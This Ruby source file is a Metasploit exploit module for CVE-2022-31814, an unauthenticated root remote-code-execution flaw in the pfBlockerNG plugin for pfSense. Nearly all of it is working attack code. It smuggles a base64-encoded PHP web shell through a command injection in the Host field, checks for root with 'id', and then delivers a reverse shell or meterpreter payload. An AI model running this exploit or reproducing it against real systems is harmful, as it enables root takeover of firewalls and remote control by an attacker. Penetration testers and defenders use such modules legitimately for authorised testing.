##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::CmdStager

  prepend Msf::Exploit::Remote::AutoCheck

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name'        => 'pfSense plugin pfBlockerNG unauthenticated RCE as root',
        'Description' => %q(
          pfBlockerNG is a popular pfSense plugin that is not installed by default. Itâ€™s generally used to
          block inbound connections from whole countries or IP ranges. Versions equal to and below 2.1.4_26 are affected
          by an unauthenticated RCE vulnerability that results in root access.
        ),
        'Author'      =>
          [
            'IHTeam',     # discovery
            'jheysel-r7'  # module
          ],
        'References'  =>
          [
            [ 'CVE', '2022-31814' ],
            [ 'URL', 'https://www.ihteam.net/advisory/pfblockerng-unauth-rce-vulnerability/']
          ],
        'License'        => MSF_LICENSE,
        'Platform'       => 'unix',
        'Privileged'     => false,
        'Arch'           => [ ARCH_CMD ],
        'Targets' => [
          [
            'Linux ',
            {
              'Platform' => 'linux',
              'Arch' => [ARCH_X86, ARCH_X64],
              'CmdStagerFlavor' => %i[printf echo],
              'Type' => :linux_dropper,
              'DefaultOptions' => { 'PAYLOAD' => 'linux/x64/meterpreter/reverse_tcp' }
            }
          ],
          [
            'Unix In-Memory',
            {
              'Platform' => 'unix',
              'Arch' => ARCH_CMD,
              'Type' => :unix_memory,
              'DefaultOptions' => { 'PAYLOAD' => 'cmd/unix/reverse_bash' }
            }
          ]
        ],
        'DefaultTarget' => 0,
        'DisclosureDate' => '2022-09-05'
      )
    )

    register_options(
      [
        Opt::RPORT(443)
      ]
    )
  end

  def check

    ## TODO
    res = send_request_cgi(
      'uri'       => normalize_uri(target_uri.path,'/pfblockerng/www/index.php'),
      'method'    => 'GET'
    )

    return Exploit::CheckCode::Safe('Could not connect to web service - no response')  if res.nil?
    return Exploit::CheckCode::Safe("pfBlockerNG does not appear to be installed - (response code: #{res.code})") if res.code != 200

    if res.body.include?('GIF') #&& Content-Type: image/gif
      Exploit::CheckCode::Appears
    end
  end

  def execute_command(cmd, _opts = {})
    # require 'pry'
    # binding.pry

    send_request_cgi({
                       'method' => 'GET',
                       'uri' => normalize_uri(target_uri.path, "/system_advanced_control.php?c=#{cmd}"),
                     })
  end

  def exploit

    print_status 'Uploading shell...'

    #TODO make file name random and or configurable

    test = "' *; echo 'PD8kYT1mb3BlbigiL3Vzci9sb2NhbC93d3cvc3lzdGVtX2FkdmFuY2VkX2NvbnRyb2wucGhwIiwidyIpIG9yIGRpZSgpOyR0PSc8P3BocCBwcmludChwYXNzdGhydSggJF9HRVRbImMiXSkpOz8+Jztmd3JpdGUoJGEsJHQpO2ZjbG9zZSggJGEpOz8+'|python3.8 -m base64 -d | php; '"

    send_request_raw(
      'uri'  => normalize_uri(target_uri.path, '/pfblockerng/www/index.php'),
      'vars_post' => {
        'Host' => test
      }
    )
    sleep 2
    check_for_shell = send_request_cgi(
      'method' => 'GET',
      'uri' => normalize_uri(target_uri.path, '/system_advanced_control.php?c=id')
    )

    # require 'pry'
    # binding.pry

    fail_with(Failure::UnexpectedReply, 'Error uploading shell, the system is likely patched ') if check_for_shell.nil? or check_for_shell.body.nil?

    if check_for_shell.body.include?("uid=0(root) gid=0(wheel)")
      print_good("Upload succeeded")
    else
      fail_with(Failure::UnexpectedReply, 'Error uploading shell, the system is likely patched')
    end

    # require 'pry'
    # binding.pry

    case target['Type']
    when :unix_memory
      execute_command(payload.encoded)
    when :linux_dropper
      execute_cmdstager
    end


  end
end
